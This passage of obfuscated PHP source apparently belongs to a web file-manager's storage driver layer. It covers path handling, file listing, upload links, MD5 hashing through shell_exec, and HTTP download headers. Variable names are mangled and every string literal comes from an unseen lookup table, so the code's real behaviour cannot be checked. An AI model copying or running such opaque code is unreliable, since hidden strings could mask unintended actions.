$Óáú—ë[$İü§¦Ğ[692]] = !0; } Hook::trigger($İü§¦Ğ[695], $Óáú—ë); } unset($Óáú—ë); $ıöÖ‚Ö = array($İü§¦Ğ[563] => array($İü§¦Ğ[7], array_keys($Ò£‘„Óå))); $‚¡½ü³ = Model($İü§¦Ğ[696]); $ó¹™£Çõ = $‚¡½ü³->where($ıöÖ‚Ö)->select(); $ó¹™£Çõ = $ó¹™£Çõ ? $ó¹™£Çõ : array(); foreach ($ó¹™£Çõ as $ÎúÀÎ¦) { if (!isset($Ò£‘„Óå[$ÎúÀÎ¦[$İü§¦Ğ[563]]])) { continue; } $Çùíş€é = $Ò£‘„Óå[$ÎúÀÎ¦[$İü§¦Ğ[563]]]; foreach ($Çùíş€é as &$Óáú—ë) { $Óáú—ë[$İü§¦Ğ[557]] = $ÎúÀÎ¦[$İü§¦Ğ[557]]; $Óáú—ë[$İü§¦Ğ[692]] = !0; } unset($Óáú—ë); } $ôäç§¬¯ = array(); foreach ($­¬ˆº÷ as $ä½§§Á™) { Hook::trigger($İü§¦Ğ[697], $ä½§§Á™); if (isset($ä½§§Á™[$İü§¦Ğ[692]]) && $ä½§§Á™[$İü§¦Ğ[692]]) { Hook::trigger($İü§¦Ğ[698], $ä½§§Á™); continue; } $ó¼¢àä = $€šÎÑ½->getPathInner($ä½§§Á™[$İü§¦Ğ[87]]); $ÆÆ¾² = $‚¡½ü³->addFileMake($ó¼¢àä, $ÁæêùáÇ, $ä½§§Á™[$İü§¦Ğ[79]], $ä½§§Á™[$İü§¦Ğ[694]], $ä½§§Á™[$İü§¦Ğ[563]], $ä½§§Á™[$İü§¦Ğ[32]], $¿ø©°Á×); Hook::trigger($İü§¦Ğ[698], $ä½§§Á™); if (!is_array($ÆÆ¾²)) { continue; } $ôäç§¬¯[] = $ÆÆ¾²; } $‚¡½ü³->addAll($ôäç§¬¯); $ıöÖ‚Ö = array($İü§¦Ğ[563] => array($İü§¦Ğ[7], array_keys($Ò£‘„Óå))); $ó¹™£Çõ = $‚¡½ü³->where($ıöÖ‚Ö)->select(); $ó¹™£Çõ = $ó¹™£Çõ ? $ó¹™£Çõ : array(); foreach ($ó¹™£Çõ as $ÎúÀÎ¦) { if (!isset($Ò£‘„Óå[$ÎúÀÎ¦[$İü§¦Ğ[563]]])) { continue; } $°œîåŠ =& $Ò£‘„Óå[$ÎúÀÎ¦[$İü§¦Ğ[563]]]; foreach ($°œîåŠ as &$Óáú—ë) { $Óáú—ë[$İü§¦Ğ[557]] = $ÎúÀÎ¦[$İü§¦Ğ[557]]; } unset($Óáú—ë); } $Öş©¿‹¯ = array(); foreach ($­¬ˆº÷ as $Ù£äãñ) { $Öş©¿‹¯[$Ù£äãñ[$İü§¦Ğ[32]]] = $Ù£äãñ; } return $Öş©¿‹¯; } } define($_SERVER[œ—üé‹ê][699], $_SERVER[œ—üé‹ê][700]); $wncgiatzqo = $_SERVER[œ—üé‹ê][701]; goto dĞ³‚Âà°; cŠ¾ÄÕ´È‡: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $³Ã¸úãŞ =& $_SERVER[œ—üé‹ê]; $this->objectDriver = array($³Ã¸úãŞ[60], $³Ã¸úãŞ[61], $³Ã¸úãŞ[62], $³Ã¸úãŞ[63], $³Ã¸úãŞ[64], $³Ã¸úãŞ[65], $³Ã¸úãŞ[66], $³Ã¸úãŞ[67], $³Ã¸úãŞ[68], $³Ã¸úãŞ[69], $³Ã¸úãŞ[70], $³Ã¸úãŞ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¨ÉÅã— ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¨ÉÅã— , $_SERVER[œ—üé‹ê][8]); } return $¨ÉÅã— ; } public function iconvApp($º‹º–ÊÈ) { return $º‹º–ÊÈ; } public function iconvSystem($á—¾ÃÎ) { return $á—¾ÃÎ; } public function iconvTo($¥«¿‘„ì, $õïš¥®ç, $ÓÒÀ¿ğ¾) { $ª ƒõ¢Ë =& $_SERVER[œ—üé‹ê]; if (!$¥«¿‘„ì || !function_exists($ª ƒõ¢Ë[72])) { return $¥«¿‘„ì; } static $ªÔ¯¹ŸĞ = array(); $”Ù³»›ğ = $õïš¥®ç . $ª ƒõ¢Ë[73] . $ÓÒÀ¿ğ¾ . $ª ƒõ¢Ë[74] . $¥«¿‘„ì; if (isset($ªÔ¯¹ŸĞ[$”Ù³»›ğ])) { return $ªÔ¯¹ŸĞ[$”Ù³»›ğ]; } if (function_exists($ª ƒõ¢Ë[75])) { $ÇÄÁ“Ò = @mb_convert_encoding($¥«¿‘„ì, $ÓÒÀ¿ğ¾, $õïš¥®ç); } else { $ÇÄÁ“Ò = @iconv($õïš¥®ç, $ÓÒÀ¿ğ¾, $¥«¿‘„ì); } $ÇÄÁ“Ò = $ÇÄÁ“Ò ? $ÇÄÁ“Ò : $¥«¿‘„ì; if (strstr($ÇÄÁ“Ò, $ª ƒõ¢Ë[76])) { $ÇÄÁ“Ò = str_replace($ª ƒõ¢Ë[76], $ª ƒõ¢Ë[11], $ÇÄÁ“Ò); } $ªÔ¯¹ŸĞ[$õïš¥®ç . $ª ƒõ¢Ë[73] . $ÓÒÀ¿ğ¾ . $ª ƒõ¢Ë[74] . $¥«¿‘„ì] = $ÇÄÁ“Ò; $ªÔ¯¹ŸĞ[$ÓÒÀ¿ğ¾ . $ª ƒõ¢Ë[73] . $õïš¥®ç . $ª ƒõ¢Ë[74] . $¥«¿‘„ì] = $¥«¿‘„ì; $ªÔ¯¹ŸĞ[$ÓÒÀ¿ğ¾ . $ª ƒõ¢Ë[73] . $õïš¥®ç . $ª ƒõ¢Ë[74] . $ÇÄÁ“Ò] = $¥«¿‘„ì; $ªÔ¯¹ŸĞ[$õïš¥®ç . $ª ƒõ¢Ë[73] . $ÓÒÀ¿ğ¾ . $ª ƒõ¢Ë[74] . $ÇÄÁ“Ò] = $ÇÄÁ“Ò; return $ÇÄÁ“Ò; } public function getPathInner($ÎœášÈ) { $ÉöéÖç = IO::init($ÎœášÈ); return $ÉöéÖç->path; } public function getPathOuter($ˆÎâó­ş) { $È±Ôµ¤Ú =& $_SERVER[œ—üé‹ê]; $Œ‹çœ¼ß = strlen(trim($this->pathBase, $È±Ôµ¤Ú[8])); $ˆÎâó­ş = substr(trim($ˆÎâó­ş, $È±Ôµ¤Ú[8]), $Œ‹çœ¼ß); return $this->pathDriver . $È±Ôµ¤Ú[8] . ltrim($ˆÎâó­ş, $È±Ôµ¤Ú[8]); } public function isParentOf($Á¯ä±™Ÿ, $Â†ÀèüÆ) { $‘ƒ¥åô =& $_SERVER[œ—üé‹ê]; $Á¯ä±™Ÿ = rtrim(strtolower($Á¯ä±™Ÿ), $‘ƒ¥åô[8]) . $‘ƒ¥åô[8]; $Â†ÀèüÆ = rtrim(strtolower($Â†ÀèüÆ), $‘ƒ¥åô[8]) . $‘ƒ¥åô[8]; $­»ààØö = strpos($Â†ÀèüÆ, $Á¯ä±™Ÿ) === 0; return $­»ààØö; } public function getType() { $Î¹Äß¼´ =& $_SERVER[œ—üé‹ê]; $œÜœİ = str_replace($Î¹Äß¼´[77], $Î¹Äß¼´[12], get_class($this)); return strtolower($œÜœİ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ó˜û´²”, $ˆ­•âÆã) { $úÃÔğ¹­ =& $_SERVER[œ—üé‹ê]; $ô­ä¸ŸÓ = rtrim($ó˜û´²”, $úÃÔğ¹­[8]) . $úÃÔğ¹­[8] . $ˆ­•âÆã; $Ñ¿ø‚‹ = $this->exist($ô­ä¸ŸÓ); return $Ñ¿ø‚‹ ? $ô­ä¸ŸÓ : !1; } public function setModifyTime($æÈˆÈõ, $Ì¢¹ö€ = '') { } public function renameObject($ºÇŞ‰“¨, $ŞŞ•ò¬ˆ) { $‰ÄÆìë« = $ŞŞ•ò¬ˆ; $ºÇŞ‰“¨ = $this->getPathOuter($ºÇŞ‰“¨); $ŞŞ•ò¬ˆ = $this->pathFather($ºÇŞ‰“¨) . $ŞŞ•ò¬ˆ; $Åˆåµ¹¢ = IO::copy($ºÇŞ‰“¨, $this->pathFather($ºÇŞ‰“¨), REPEAT_RENAME_FOLDER, $‰ÄÆìë«); if ($Åˆåµ¹¢) { IO::remove($ºÇŞ‰“¨); } return $Åˆåµ¹¢ ? $ŞŞ•ò¬ˆ : !1; } public function tempFile($ÅÙ“ìá = '', $¤¹š¤õ³ = '') { if (!$ÅÙ“ìá) { $ÅÙ“ìá = rand_string(15); } $òšçÆÈä = TEMP_FILES . rand_string(15) . $_SERVER[œ—üé‹ê][8]; @mkdir($òšçÆÈä, DEFAULT_PERRMISSIONS, !0); $»²ÄÂÉŠ = $òšçÆÈä . $ÅÙ“ìá; @touch($»²ÄÂÉŠ); if ($¤¹š¤õ³) { file_put_contents($»²ÄÂÉŠ, $¤¹š¤õ³); } return $»²ÄÂÉŠ; } public function tempFileRemve($Š„ÅËˆ†) { @unlink($Š„ÅËˆ†); @rmdir($this->pathFather($Š„ÅËˆ†)); } public function mkfile($°Êô¶ºê, $†ÓŠ¢Ìö = '', $‚€Ùæœ¥ = REPEAT_RENAME) { } public function mkdir($½÷µšÍ–, $·İˆ = REPEAT_SKIP) { } public function delFile($í¬óÆ¹Œ) { } public function delFolder($›Ÿ‡·ƒş) { } public function copyFile($÷ÊÓ€›€, $øµ›²ºÌ) { } public function moveFile($Ú÷¡ÜïË, $ÆÊâ±ß») { } public function remove($€–¥²˜) { if ($this->isFile($€–¥²˜)) { return $this->delFile($€–¥²˜); } return $this->delFolder($€–¥²˜); } public function rename($‡«ºŠ½, $…ÎÛâÃƒ) { } public function exist($‹ÏıÒ¡˜) { } public function isFile($Ôş¬¬º†) { } public function isFolder($Á©ñ¹‡š) { } public function size($ÚÀ›Ã™) { } public function info($ âµĞÓ×) { } public function infoSimple($“¡Ëáî) { return $this->info($“¡Ëáî); } public function infoAuth($ï¯Õ€Ù‹) { return $this->info($ï¯Õ€Ù‹); } public function infoFull($‡ŠÆò¶) { return $this->info($‡ŠÆò¶); } public function infoFullSimple($æ’ğø¹ô) { return $this->info($æ’ğø¹ô); } public function infoWithChildren($€µÁÆÇ–) { $˜¥ó¢í =& $_SERVER[œ—üé‹ê]; static $Ã™ÌŒªÓ = array(); if (isset($Ã™ÌŒªÓ[$€µÁÆÇ–])) { return $Ã™ÌŒªÓ[$€µÁÆÇ–]; } $§¹±èÃ = $this->info($€µÁÆÇ–); if ($§¹±èÃ && $§¹±èÃ[$˜¥ó¢í[33]] == $˜¥ó¢í[78]) { $½èò¾ Ë = array($˜¥ó¢í[79] => 0, $˜¥ó¢í[80] => 0, $˜¥ó¢í[81] => 0); $this->infoChildren($€µÁÆÇ–, $½èò¾ Ë); $§¹±èÃ[$˜¥ó¢í[79]] = $½èò¾ Ë[$˜¥ó¢í[79]]; $§¹±èÃ[$˜¥ó¢í[82]] = array($˜¥ó¢í[83] => $½èò¾ Ë[$˜¥ó¢í[80]], $˜¥ó¢í[84] => $½èò¾ Ë[$˜¥ó¢í[81]]); $Ã™ÌŒªÓ[$€µÁÆÇ–] = $§¹±èÃ; } return $§¹±èÃ; } public function listPath($ÙøúÃíë, $Ãœ×Ö = false) { } public function has($ò¹•ÖÖÂ, $÷²Ìù‹ñ = false, $©ô¯¨ = false) { } public function canRead($äÕœ“…ï) { } public function canWrite($Ş¬Ú·ÀŠ) { } public function getContent($ù¥Û¥Ş´) { } public function setContent($õ¬œŸÇ…, $õƒË¢²“ = '') { } protected function infoChildren($Ã’Ï–ğ¡, &$„Äûùâ) { $‡¼òîúå =& $_SERVER[œ—üé‹ê]; check_abort_echo(); $»½ŞÊŒì = $this->listPath($Ã’Ï–ğ¡, !0); $»½ŞÊŒì = array_merge($»½ŞÊŒì[$‡¼òîúå[85]], $»½ŞÊŒì[$‡¼òîúå[86]]); foreach ($»½ŞÊŒì as $»ï’ôæ”) { if ($»ï’ôæ”[$‡¼òîúå[33]] == $‡¼òîúå[78]) { $„Äûùâ[$‡¼òîúå[81]]++; $­¼§¸îÖ = $this->getPathInner($»ï’ôæ”[$‡¼òîúå[87]]); $this->infoChildren($­¼§¸îÖ, $„Äûùâ); } else { $„Äûùâ[$‡¼òîúå[80]]++; $„Äûùâ[$‡¼òîúå[79]] += $»ï’ôæ”[$‡¼òîúå[79]]; } } } public function fileSubstr($½üó¡Ş³, $Ì‡ËâÇ™, $«øÈô²å) { } public function listAll($ÛƒÏÉÔŠ) { } public function listAllMake($–¢ßÃ”ø, &$Óêˆ‚¡è) { $Ìƒ¨—ßû =& $_SERVER[œ—üé‹ê]; check_abort_echo(); $·Ø…•® = $this->listPath($–¢ßÃ”ø, !0); if (!$·Ø…•®) { return; } $íâÂì· = array_merge($·Ø…•®[$Ìƒ¨—ßû[85]], $·Ø…•®[$Ìƒ¨—ßû[86]]); foreach ($íâÂì· as $¢âõ¿®) { $öğø«… = $¢âõ¿®[$Ìƒ¨—ßû[33]] == $Ìƒ¨—ßû[78]; $´¸»ŠùÑ = array($Ìƒ¨—ßû[87] => $¢âõ¿®[$Ìƒ¨—ßû[87]], $Ìƒ¨—ßû[78] => $öğø«…); if (isset($¢âõ¿®[$Ìƒ¨—ßû[79]])) { $´¸»ŠùÑ[$Ìƒ¨—ßû[79]] = $¢âõ¿®[$Ìƒ¨—ßû[79]]; } if (isset($¢âõ¿®[$Ìƒ¨—ßû[88]])) { $´¸»ŠùÑ[$Ìƒ¨—ßû[88]] = $¢âõ¿®[$Ìƒ¨—ßû[88]]; } if (!$öğø«…) { $Óêˆ‚¡è[] = $´¸»ŠùÑ; continue; } $Óêˆ‚¡è[] = $´¸»ŠùÑ; $¥×ü“Û = $¢âõ¿®[$Ìƒ¨—ßû[87]]; $¸Ïóã©¾ = $this->pathDriver; if (substr($¢âõ¿®[$Ìƒ¨—ßû[87]], 0, strlen($¸Ïóã©¾)) == $¸Ïóã©¾) { $¥×ü“Û = substr($¥×ü“Û, strlen($¸Ïóã©¾)); } $this->listAllMake($¥×ü“Û, $Óêˆ‚¡è); } } public function listAllSimple($ÖíÕÇ®ò, $ÔŸ‹ÏÕ = false) { $ûü²á¾× = $this->listAll($ÖíÕÇ®ò); return $this->listAllSimpleMake($ûü²á¾×, $this->getPathOuter($ÖíÕÇ®ò), $ÔŸ‹ÏÕ); } public function listAllSimpleMake($¤´•ğŸ, $Ø¾¹¬¯Ÿ, $¡¼îø–) { $Ğ“ğş×Ğ =& $_SERVER[œ—üé‹ê]; $ß ã¿ı = array(); $Ø¾¹¬¯Ÿ = rtrim(get_path_father($Ø¾¹¬¯Ÿ), $Ğ“ğş×Ğ[8]) . $Ğ“ğş×Ğ[8]; foreach ($¤´•ğŸ as $öÂİ˜†³) { $·ÈèèÉ€ = array($Ğ“ğş×Ğ[87] => $öÂİ˜†³[$Ğ“ğş×Ğ[87]], $Ğ“ğş×Ğ[89] => $öÂİ˜†³[$Ğ“ğş×Ğ[87]], $Ğ“ğş×Ğ[78] => $öÂİ˜†³[$Ğ“ğş×Ğ[78]]); if (isset($öÂİ˜†³[$Ğ“ğş×Ğ[79]]) && !$öÂİ˜†³[$Ğ“ğş×Ğ[78]]) { $·ÈèèÉ€[$Ğ“ğş×Ğ[79]] = $öÂİ˜†³[$Ğ“ğş×Ğ[79]]; } if (isset($öÂİ˜†³[$Ğ“ğş×Ğ[88]])) { $·ÈèèÉ€[$Ğ“ğş×Ğ[88]] = $öÂİ˜†³[$Ğ“ğş×Ğ[88]]; } if (is_array($öÂİ˜†³[$Ğ“ğş×Ğ[90]])) { $·ÈèèÉ€[$Ğ“ğş×Ğ[89]] = $öÂİ˜†³[$Ğ“ğş×Ğ[90]][$Ğ“ğş×Ğ[87]]; $·ÈèèÉ€[$Ğ“ğş×Ğ[79]] = $öÂİ˜†³[$Ğ“ğş×Ğ[90]][$Ğ“ğş×Ğ[79]]; $·ÈèèÉ€[$Ğ“ğş×Ğ[88]] = $öÂİ˜†³[$Ğ“ğş×Ğ[90]][$Ğ“ğş×Ğ[88]]; } else { if (substr($öÂİ˜†³[$Ğ“ğş×Ğ[87]], 0, strlen($Ø¾¹¬¯Ÿ)) == $Ø¾¹¬¯Ÿ) { $·ÈèèÉ€[$Ğ“ğş×Ğ[87]] = substr($öÂİ˜†³[$Ğ“ğş×Ğ[87]], strlen($Ø¾¹¬¯Ÿ)); } } $™³Øïı‹ = $öÂİ˜†³[$Ğ“ğş×Ğ[78]] ? $Ğ“ğş×Ğ[8] : $Ğ“ğş×Ğ[12]; $·ÈèèÉ€[$Ğ“ğş×Ğ[89]] = rtrim($·ÈèèÉ€[$Ğ“ğş×Ğ[89]], $Ğ“ğş×Ğ[8]) . $™³Øïı‹; $·ÈèèÉ€[$Ğ“ğş×Ğ[87]] = $Ğ“ğş×Ğ[8] . trim($·ÈèèÉ€[$Ğ“ğş×Ğ[87]], $Ğ“ğş×Ğ[8]) . $™³Øïı‹; if (!$¡¼îø–) { $ŸòÄûÏ« = explode($Ğ“ğş×Ğ[8], trim($·ÈèèÉ€[$Ğ“ğş×Ğ[87]], $Ğ“ğş×Ğ[8])); $·ÈèèÉ€[$Ğ“ğş×Ğ[87]] = $Ğ“ğş×Ğ[8] . implode($Ğ“ğş×Ğ[8], array_slice($ŸòÄûÏ«, 1)) . $™³Øïı‹; } $ß ã¿ı[] = $·ÈèèÉ€; } return array_sort_by($ß ã¿ı, $Ğ“ğş×Ğ[87]); } public function upload($ÅóÒªÎ, $Ê²¯®´È, $ÏÂŸØ­¾ = false, $ò³•ù¡„ = REPEAT_REPLACE) { } public function uploadFileByID($±âƒšë, $Œİ°“ê, $ä¬è¿±) { } public function uploadFileByPath($÷ì„‡, $ÁãòÏê, $ı…úÜœ† = array()) { } public function isUploadServer() { $©Ó²Ùû =& $_SERVER[œ—üé‹ê]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $©Ó²Ùû[91]) { return !0; } return $GLOBALS[$©Ó²Ùû[6]][$©Ó²Ùû[92]][$©Ó²Ùû[93]]; } public function isFileOutServer() { $úÔí¢¸‚ =& $_SERVER[œ—üé‹ê]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $úÔí¢¸‚[91]) { return !0; } return $GLOBALS[$úÔí¢¸‚[6]][$úÔí¢¸‚[92]][$úÔí¢¸‚[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($èöå¤Ğ¨) { $Î’º÷Ëø =& $_SERVER[œ—üé‹ê]; if (!$this->isCdnHost()) { return $èöå¤Ğ¨; } return str_replace(trim(get_url_root($èöå¤Ğ¨), $Î’º÷Ëø[8]), trim($this->cdnHost, $Î’º÷Ëø[8]), $èöå¤Ğ¨); } public function uploadLink($†ëÀ¾Áã, $³™Íôú« = 0) { $•¤‡æÀ =& $_SERVER[œ—üé‹ê]; if ($this->isUploadServer()) { return; } $¶ñŠÑŞÃ = $this->getType(); if (!in_array($¶ñŠÑŞÃ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $òèìÇŒĞ = 1024 * 1024 * 10; $˜¯‰û¥ = (!$³™Íôú« ? 1 : ceil($³™Íôú« / pow(1024, 3))) * 3600 * 4; if ($³™Íôú« <= $òèìÇŒĞ) { $°¨ÃµŸµ = $this->uploadFormData($†ëÀ¾Áã, $˜¯‰û¥); } else { $°¨ÃµŸµ = $this->uploadMultiData($†ëÀ¾Áã, $˜¯‰û¥); } if ($°¨ÃµŸµ) { $°¨ÃµŸµ[$•¤‡æÀ[95]] = $†ëÀ¾Áã; $°¨ÃµŸµ[$•¤‡æÀ[96]] = $¶ñŠÑŞÃ; } return $°¨ÃµŸµ; } public function uploadFormData($åÀµê»Ú, $ıìûÁ½µ = 3600) { } public function uploadMultiData($ƒš§•Ş¶, $ö±¢‚¬í = 3600) { } public function multiUploadFormData($ıé—Š‡‘, $¥³ù˜§Ø = 3600) { return $this->uploadMultiData($ıé—Š‡‘, $¥³ù˜§Ø); } public function download($ü‡ØÛÑ¢, $”¢ÃôÓÜ) { } public function ext($ùÌ„´ıĞ) { return get_path_ext($ùÌ„´ıĞ); } public function pathThis($ç»û¸´ä) { $ÎÅšÕ‘— =& $_SERVER[œ—üé‹ê]; $ç»û¸´ä = str_replace($ÎÅšÕ‘—[97], $ÎÅšÕ‘—[8], rtrim($ç»û¸´ä, $ÎÅšÕ‘—[8])); $áº±Ó´¾ = strrpos($ç»û¸´ä, $ÎÅšÕ‘—[8]); if ($áº±Ó´¾ === !1) { return $ç»û¸´ä; } return substr($ç»û¸´ä, $áº±Ó´¾ + 1); } public function pathFather($±çšÛ¼¸) { $ñ—»Ôì• =& $_SERVER[œ—üé‹ê]; $±çšÛ¼¸ = str_replace($ñ—»Ôì•[97], $ñ—»Ôì•[8], rtrim($±çšÛ¼¸, $ñ—»Ôì•[8])); $á¡õ›ñ— = strrpos($±çšÛ¼¸, $ñ—»Ôì•[8]); if ($á¡õ›ñ— === !1) { return $ñ—»Ôì•[12]; } return substr($±çšÛ¼¸, 0, $á¡õ›ñ— + 1); } public function hashSimple($ËâĞƒÑŠ) { $´Áğ =& $_SERVER[œ—üé‹ê]; if (!$ËâĞƒÑŠ) { return md5($´Áğ[12]); } $ĞÏ“ÓèÌ = $this->size($ËâĞƒÑŠ); $§°¹Ú ı = 200; $ŒŒ”õØû = 50; if ($ĞÏ“ÓèÌ <= $§°¹Ú ı * $ŒŒ”õØû) { return $this->hashMd5($ËâĞƒÑŠ) . $ĞÏ“ÓèÌ; } $×õŞì¹À = intval($ĞÏ“ÓèÌ / $ŒŒ”õØû); $äšìù = $´Áğ[12]; for ($‹à™¥ù = 0; $‹à™¥ù < $ŒŒ”õØû; $‹à™¥ù++) { $äšìù .= $this->fileSubstr($ËâĞƒÑŠ, $×õŞì¹À * $‹à™¥ù, $§°¹Ú ı); } $äšìù .= $this->fileSubstr($ËâĞƒÑŠ, $ĞÏ“ÓèÌ - $§°¹Ú ı, $§°¹Ú ı); return md5($äšìù) . $ĞÏ“ÓèÌ; } public static $md5Cache = array(); public function hashMd5($¯½Ã·©Ş) { if (!$¯½Ã·©Ş) { return md5($_SERVER[œ—üé‹ê][12]); } $¯½Ã·©Ş = $this->iconvSystem($¯½Ã·©Ş); if (isset(self::$md5Cache[$¯½Ã·©Ş])) { return self::$md5Cache[$¯½Ã·©Ş]; } self::$md5Cache[$¯½Ã·©Ş] = $this->hashMd5Shell($¯½Ã·©Ş); if (!self::$md5Cache[$¯½Ã·©Ş]) { self::$md5Cache[$¯½Ã·©Ş] = @md5_file($¯½Ã·©Ş); } return self::$md5Cache[$¯½Ã·©Ş]; } private function hashMd5Shell($ûğ·åóˆ) { $²¸“Ìªã =& $_SERVER[œ—üé‹ê]; if (!$ûğ·åóˆ) { return md5($²¸“Ìªã[12]); } if (!function_exists($²¸“Ìªã[98])) { return !1; } $íçÂ¥Áî = array($²¸“Ìªã[99], $²¸“Ìªã[100]); $ç‰óÁÙÌ = Cache::get($²¸“Ìªã[101]); if (!$ç‰óÁÙÌ) { $áı¤ğµù = BASIC_PATH . $²¸“Ìªã[102]; $ÒŸÈªÏš = md5_file($áı¤ğµù); $ç‰óÁÙÌ = $²¸“Ìªã[103]; foreach ($íçÂ¥Áî as $ãÚ—àÚ) { $Ú•ƒ­Èş = shell_exec($ãÚ—àÚ . $²¸“Ìªã[53] . escapeShell($áı¤ğµù)); if ($Ú•ƒ­Èş && substr(trim($Ú•ƒ­Èş), 0, 32) == $ÒŸÈªÏš) { $ç‰óÁÙÌ = $ãÚ—àÚ; break; } } Cache::set($²¸“Ìªã[101], $ç‰óÁÙÌ, 3600); } if ($ç‰óÁÙÌ == $²¸“Ìªã[103]) { return !1; } $Ú•ƒ­Èş = shell_exec($ç‰óÁÙÌ . $²¸“Ìªã[53] . escapeShell($ûğ·åóˆ)); $Ú•ƒ­Èş = str_replace($²¸“Ìªã[104], $²¸“Ìªã[12], $Ú•ƒ­Èş); return substr($Ú•ƒ­Èş, 0, 32); } public function link($šê²›çï) { return $šê²›çï; } public function fileOut($’Æ¡±Îà, $œì¬¯ÙÜ = false, $ù÷ü‹şæ = false, $¢üÑğ± = '') { $ÍõÄèµ =& $_SERVER[œ—üé‹ê]; $this->cacheMethod(null, null); if (!$’Æ¡±Îà || !$this->exist($’Æ¡±Îà)) { show_json(LNG($ÍõÄèµ[105]), !1, $ù÷ü‹şæ); } $ª˜ØØïà = $this->getType() == $ÍõÄèµ[106]; $ ²½ÍÉ´ = $GLOBALS[$ÍõÄèµ[6]][$ÍõÄèµ[92]][$ÍõÄèµ[107]][$ÍõÄèµ[108]]; $æûíÁ™µ = (double) $GLOBALS[$ÍõÄèµ[6]][$ÍõÄèµ[92]][$ÍõÄèµ[107]][$ÍõÄèµ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $º¦ãüƒƒ = $this->infoFull($’Æ¡±Îà); $·ÊçÇ§ı = $º¦ãüƒƒ[$ÍõÄèµ[79]]; $‘·üêš = gmdate($ÍõÄèµ[110], $º¦ãüƒƒ[$ÍõÄèµ[88]]); $ÆÌÈ†İ = $ù÷ü‹şæ ? $ù÷ü‹şæ : $this->iconvApp($º¦ãüƒƒ[$ÍõÄèµ[32]]); $äÄñÜúÖ = 0; $Ùš–úİ = $·ÊçÇ§ı - 1; $¸Æİ•Ì¬ = $this->ext($ÆÌÈ†İ); if (in_array($¸Æİ•Ì¬, array($ÍõÄèµ[111], $ÍõÄèµ[112], $ÍõÄèµ[113], $ÍõÄèµ[114]))) { $¸Æİ•Ì¬ = $ÍõÄèµ[115]; } if (in_array($¸Æİ•Ì¬, array($ÍõÄèµ[116]))) { $¸Æİ•Ì¬ = $ÍõÄèµ[117]; } if (!$¢üÑğ±) { $¢üÑğ± = md5($‘·üêš . $·ÊçÇ§ı); } $¢üÑğ± = $ÍõÄèµ[118] . $¢üÑğ± . $ÍõÄèµ[118]; $›ÑœÍûŞ = get_file_mime($¸Æİ•Ì¬); $ø¿ˆÙÙ = !0; $ø¿ˆÙÙ = isset($_GET[$ÍõÄèµ[119]]) ? !1 : !0; if ($œì¬¯ÙÜ === !1 && !mime_support($›ÑœÍûŞ)) { $›ÑœÍûŞ = $ÍõÄèµ[120]; } header($ÍõÄèµ[121]); header($ÍõÄèµ[122] . $›ÑœÍûŞ); $§Å™÷ = rawurlencode($ÆÌÈ†İ); $§Å™÷ = $ÍõÄèµ[118] . $§Å™÷ . $ÍõÄèµ[123] . $§Å™÷; if ($œì¬¯ÙÜ) { header($ÍõÄèµ[124]); header($ÍõÄèµ[125] . $§Å™÷); } else { if ($ø¿ˆÙÙ) { header($ÍõÄèµ[126] . $§Å™÷); } } $†È½ç» = 3600 * 24 * 30; header($ÍõÄèµ[127]); header($ÍõÄèµ[128]); header($ÍõÄèµ[129] . $†È½ç»); header($ÍõÄèµ[130] . gmdate($ÍõÄèµ[110], time() + $†È½ç») . $ÍõÄèµ[131]); if (isset($_SERVER[$ÍõÄèµ[132]]) && strtotime($_SERVER[$ÍõÄèµ[132]]) == $º¦ãüƒƒ[$ÍõÄèµ[88]]) { header($ÍõÄèµ[133], !0, 304); die; } if (isset($_SERVER[$ÍõÄèµ[134]]) && $_SERVER[$ÍõÄèµ[134]] == $¢üÑğ±) { header($ÍõÄèµ[135] . $¢üÑğ±, !0, 304); die; } header($ÍõÄèµ[135] . $¢üÑğ±); header($ÍõÄèµ[136] . $‘·üêš . $ÍõÄèµ[131]); header($ÍõÄèµ[137] . rawurlencode($ÆÌÈ†İ)); header($ÍõÄèµ[138]); header($ÍõÄèµ[139] . $·ÊçÇ§ı); header($ÍõÄèµ[140]); Hook::trigger($ÍõÄèµ[141], $’Æ¡±Îà, $·ÊçÇ§ı, $ÆÌÈ†İ, $¸Æİ•Ì¬); if (!$œì¬¯ÙÜ && $¸Æİ•Ì¬ == $ÍõÄèµ[142]) { if ($·ÊçÇ§ı > 1024 * 1024 * 10) { die; } $åì€À§Ğ = $this->getContent($’Æ¡±Îà); $åì€À§Ğ = Html::clearSVG($åì€À§Ğ); header($ÍõÄèµ[143] . strlen($åì€À§Ğ)); echo $åì€À§Ğ; die; } $–Úê¨„â = strtolower($_SERVER[$ÍõÄèµ[144]]); if ($ª˜ØØïà && $–Úê¨„â && $ ²½ÍÉ´) { if (strstr($–Úê¨„â, $ÍõÄèµ[145])) { header($ÍõÄèµ[146] . $’Æ¡±Îà); } else { if (strstr($–Úê¨„â, $ÍõÄèµ[147])) { header($ÍõÄèµ[148] . $’Æ¡±Îà); } else { if (strstr($–Úê¨„â, $ÍõÄèµ[149])) { header($ÍõÄèµ[150] . $’Æ¡±Îà); } } } if ($æûíÁ™µ) { header($ÍõÄèµ[151] . $æûíÁ™µ); } return; } if (isset($_SERVER[$ÍõÄèµ[152]])) { if (preg_match($ÍõÄèµ[153], $_SERVER[$ÍõÄèµ[152]], $ŠˆğûÆì)) { $äÄñÜúÖ = intval($ŠˆğûÆì[1]); $äÄñÜúÖ = $äÄñÜúÖ <= 0 ? 0 : ($äÄñÜúÖ >= $Ùš–úİ ? $Ùš–úİ : $äÄñÜúÖ); if (!empty($ŠˆğûÆì[2])) { $ñ’îİ© = intval($ŠˆğûÆì[2]); $Ùš–úİ = $ñ’îİ© < $äÄñÜúÖ ? $äÄñÜúÖ : ($ñ’îİ© >= $Ùš–úİ ? $Ùš–úİ : $ñ’îİ©); } } header($ÍõÄèµ[154]); 